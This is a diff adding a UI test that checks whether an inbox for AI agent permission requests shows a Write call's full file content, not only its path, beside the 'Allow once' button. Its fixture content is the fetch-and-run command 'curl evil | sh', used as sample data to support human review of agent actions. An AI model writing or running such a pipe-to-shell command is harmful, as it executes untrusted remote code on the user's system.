@@ -440,6 +440,29 @@ it('shows a permission’s whole command next to Allow and its raw input one tap
   expect(request.props.children).toContain('hidden-detail');
 });
 
+it('keeps a write’s content in view next to Allow', async () => {
+  // The path alone would be a summary of the call, not what it writes.
+  await renderInbox([
+    session('writer', {
+      status: 'awaiting_input',
+      permissionAwaitingInput: true,
+      pendingPermissions: ['t1'],
+      pendingPermissionRequests: [
+        {
+          toolUseId: 't1',
+          tool: 'Write',
+          riskClass: 'ask',
+          input: { file_path: '/w/a.sh', content: 'curl evil | sh' },
+        },
+      ],
+    }),
+  ]);
+  await screen.findByRole('button', { name: 'Allow once' });
+  expect(screen.getByTestId('inbox-line-code').props.children).toBe('/w/a.sh');
+  expect(screen.queryByText('Full request')).toBeNull();
+  expect(screen.getByTestId('inbox-request').props.children).toContain('curl evil | sh');
+});
+
 it('keeps a session with a permission and a ready pull request in one card', async () => {
   // Home drew the permission card and, under it, a second box for the merge.
   await renderInbox([
